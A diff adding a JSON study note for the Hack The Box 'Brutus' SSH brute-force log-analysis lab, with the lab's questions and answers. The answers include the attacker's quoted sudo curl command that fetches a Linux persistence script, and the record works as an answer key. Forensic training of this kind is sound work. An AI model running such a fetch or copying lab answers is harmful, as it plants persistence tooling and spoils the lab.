@@ -1,0 +1,137 @@
+{
+  "id": "log analysis labs/brutus (htb)",
+  "title": "Brutus (HTB)",
+  "slug": "brutus-htb",
+  "relPath": "Log Analysis Labs/Brutus (HTB).md",
+  "level": "L1.5",
+  "curriculumLevelId": "l15",
+  "curriculumSectionId": "l15-advanced-querying",
+  "curriculumSectionTitle": "Advanced Querying",
+  "tags": [
+    "Persistence"
+  ],
+  "mitre": [
+    "T1136.001"
+  ],
+  "parentId": "log analysis labs",
+  "children": [],
+  "relatedLinks": [],
+  "backlinks": [
+    "log analysis labs"
+  ],
+  "breadcrumbs": [
+    {
+      "id": "log analysis labs",
+      "title": "Log Analysis Labs",
+      "slug": "log-analysis-labs"
+    },
+    {
+      "id": "log analysis labs/brutus (htb)",
+      "title": "Brutus (HTB)",
+      "slug": "brutus-htb"
+    }
+  ],
+  "headings": [
+    {
+      "level": 1,
+      "text": "Brutus (HTB)"
+    },
+    {
+      "level": 2,
+      "text": "Scenario"
+    },
+    {
+      "level": 3,
+      "text": "1- Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?"
+    },
+    {
+      "level": 3,
+      "text": "65.2.161.68"
+    },
+    {
+      "level": 3,
+      "text": "2- The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?"
+    },
+    {
+      "level": 3,
+      "text": "root"
+    },
+    {
+      "level": 3,
+      "text": "3- Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact."
+    },
+    {
+      "level": 3,
+      "text": "2024-03-06 06:32:45"
+    },
+    {
+      "level": 3,
+      "text": "4- SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?"
+    },
+    {
+      "level": 3,
+      "text": "37"
+    },
+    {
+      "level": 3,
+      "text": "5- The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?"
+    },
+    {
+      "level": 3,
+      "text": "cyberjunkie"
+    },
+    {
+      "level": 3,
+      "text": "6- What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?"
+    },
+    {
+      "level": 3,
+      "text": "T1136.001"
+    },
+    {
+      "level": 3,
+      "text": "7- What time did the attacker's first SSH session end according to auth.log?"
+    },
+    {
+      "level": 3,
+      "text": "2024-03-06 06:37:24"
+    },
+    {
+      "level": 3,
+      "text": "8- The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?"
+    },
+    {
+      "level": 3,
+      "text": "/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh"
+    }
+  ],
+  "overview": "In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, ",
+  "study": {
+    "overview": "In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, ",
+    "whySoc": "Use this note as an analyst reference: understand the concept, identify the relevant telemetry, pivot through evidence, and document the decision path clearly.",
+    "keyConcepts": [
+      "Brutus (HTB)",
+      "Scenario",
+      "1- Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?",
+      "65.2.161.68",
+      "2- The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?",
+      "root",
+      "3- Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.",
+      "2024-03-06 06:32:45",
+      "4- SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?",
+      "37",
+      "5- The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?",
+      "cyberjunkie"
+    ],
+    "workflow": [
+      "Identify the user, host, process, network flow, or identity object involved.",
+      "Collect the highest-value logs first and preserve timestamps and assumptions.",
+      "Pivot through related notes, telemetry sources, and MITRE references.",
+      "Document findings, gaps, containment options, and detection improvements."
+    ],
+    "splunkExamples": [],
+    "importantCommands": [],
+    "tools": [],
+    "tips": []
+  }
+}
